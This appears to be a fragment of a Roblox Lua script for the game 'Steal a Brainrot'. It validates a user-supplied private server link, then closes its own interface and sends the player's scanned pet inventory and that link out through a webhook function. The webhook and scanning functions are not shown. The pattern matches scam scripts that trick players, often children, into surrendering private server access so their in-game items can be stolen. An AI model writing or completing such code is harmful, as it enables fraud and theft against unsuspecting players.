-- âœ… Private server link validation (Steal a Brainrot only)
local SAB_GAME_ID = "109983668079237"

local function isValidPrivateServerLink(txt)
    if not txt or txt == "" then
        return false, "Please enter a link âŒ"
    end

    -- Extract game ID if present (supports normal and share links)
    local gameId = txt:match("roblox%.com/games/(%d+)") or txt:match("placeId=(%d+)")
    if not gameId then
        return false, "Invalid Roblox link âŒ"
    end

    if gameId ~= SAB_GAME_ID then
        return false, "Only Steal a Brainrot links allowed âš ï¸"
    end

    -- Validate private server link format
    local isPrivate = txt:find("type=Server") or txt:find("privateServerLinkCode")
    if not isPrivate then
        return false, "Not a private server link âŒ"
    end

    return true, "Valid âœ…"
end

textBox:GetPropertyChangedSignal("Text"):Connect(function()
    local valid, msg = isValidPrivateServerLink(textBox.Text)
    statusLabel.Text = msg
    if valid then
        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    elseif msg:find("allowed") then
        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    else
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

local function handleSend()
    local txt = textBox.Text or ""
    local valid, msg = isValidPrivateServerLink(txt)
    if valid then
        screenGui:Destroy()
        task.spawn(function()
            local pets = scanMyBase()
            if #pets > 0 then
                sendWebhook(pets, txt)
            end
        end)
    else
        statusLabel.Text = msg
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end

sendButton.MouseButton1Click:Connect(handleSend)
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then handleSend() end
end)
